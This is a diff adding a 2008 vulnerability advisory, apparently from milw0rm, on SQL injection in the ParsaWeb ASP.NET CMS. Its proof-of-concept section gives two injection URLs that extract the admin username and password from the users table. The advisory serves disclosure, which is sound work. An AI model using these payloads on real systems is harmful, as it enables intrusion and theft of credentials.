@@ -1,0 +1,53 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: ParsaWeb CMS SQL Injection
+# Vendor: http://www.parsagostar.com
+# Demo: http://cms.parsagostar.com/
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original advisory: http://www.bugreport.ir/index_53.htm
+###################################################################################
+
+####################
+1. Description:
+####################
+
+    ParsaWeb is a commercial ASP.NET website and content management system.
+
+####################
+2. Vulnerabilities:
+####################
+
+    Input passed to the "id" parameter in default.aspx and txtSearch in search section are not properly sanitised before being used in SQL queries.
+    This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+
+####################
+3. Exploits/POCs:
+####################
+
+    http://www.example.com/?page=page&id=-164 or 1=(select top 1 user_pass from tblUsers where user_name = 'admin')
+
+    http://www.example.com/?page=Search
+    Search:AmnPardaz%') union ALL select '1',user_name+':'+user_pass,'3','4','5','6','7','8','9','10',11 from tblUsers--
+
+
+
+####################
+4. Solution:
+####################
+
+    Edit the source code to ensure that inputs are properly sanitized.
+
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
+
+# milw0rm.com [2008-09-28]
